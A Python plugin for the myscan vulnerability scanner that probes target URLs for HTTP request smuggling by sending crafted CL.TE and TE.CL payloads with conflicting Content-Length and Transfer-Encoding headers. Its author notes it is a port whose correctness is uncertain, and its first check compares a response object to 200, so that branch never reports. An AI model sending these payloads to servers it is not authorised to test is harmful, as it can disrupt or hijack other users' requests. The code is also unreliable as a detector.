#!/usr/bin/env python3
# @Time    : 2020-02-24
# @Author  : caicai
# @File    : myscan_redirect.py
'''
请求走私插件
移植的w13scan的poc 不知道对不对
'''
import re
from urllib import parse as urlparse
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.lib.parse.response_parser import response_parser
from myscan.lib.helper.request import request
from myscan.lib.core.common import get_random_str
from myscan.lib.core.const import notAcceptedExt,URL_ARGS
from myscan.config import scan_set
import requests
from requests import Request, Session
from myscan.lib.helper.commons import generateResponse


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        # scheme的poc不同perfoler和perfile,没有workdata没有data字段,所以无self.url
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "http smuggling"
        self.vulmsg = "请求走私漏洞"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        cycle = 5
        if self.dictdata.get("url").get("extension").lower() in notAcceptedExt:
            return
        parser = dictdata_parser(self.dictdata)
        if parser.url.get("url").count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        if parser.response is not None and parser.response['status'] != 200:
            return
        url = parser.url.get("url")
        headers = parser.request.get("headers")
        for i in range(cycle):
            payload_headers = {
                "Content-Length": "6",
                "Transfer-Encoding": "chunked"
            }
            data = b'0\r\n\r\nS'.decode()
            temp_header = headers.copy()
            for k, v in payload_headers.items():
                if k.lower() in temp_header:
                    temp_header[k.lower()] = v
                else:
                    temp_header[k] = v
            try:

                r = requests.post(url, headers=temp_header, data=data, timeout=30)
            except:
                continue
            if r.status_code == 403 and parser.getresponsebody() != r.text:
                r2 = requests.get(url, headers=headers)
                if r2 == 200:
                    self.result.append({
                        "name": self.name,
                        "url": parser.url.get("url"),
                        "level": self.level,  # 0:Low  1:Medium 2:High
                        "detail": {
                            "vulmsg": self.vulmsg + "request_smuggling CL.TE型",
                            "request": r.reqinfo,
                            "response": generateResponse(r)
                        }
                    })
                    return
        # request_smuggling_te_cl
        for i in range(cycle + 1):
            payload_headers = {
                "Content-Length": "3",
                "Transfer-Encoding": "chunked"
            }
            data = b'1\r\nD\r\n0\r\n\r\n'.decode()
            req = Request('POST', url, data=data, headers=headers)
            prepped = req.prepare()
            for k, v in payload_headers.items():
                if k.lower() in prepped.headers:
                    del prepped.headers[k.lower()]
                prepped.headers[k] = v
            s = Session()
            try:
                r = s.send(prepped)
            except:
                continue
            if r.status_code == 403 and parser.getresponsebody() != r.text:
                r2 = requests.get(url, headers=headers)
                if r2.status_code == 200:
                    self.result.append({
                        "name": self.name,
                        "url": parser.url.get("url"),
                        "level": self.level,  # 0:Low  1:Medium 2:High
                        "detail": {
                            "vulmsg": self.vulmsg + "request_smuggling TE.CL型",
                            "request": r.reqinfo,
                            "response": generateResponse(r)
                        }
                    })
                    return
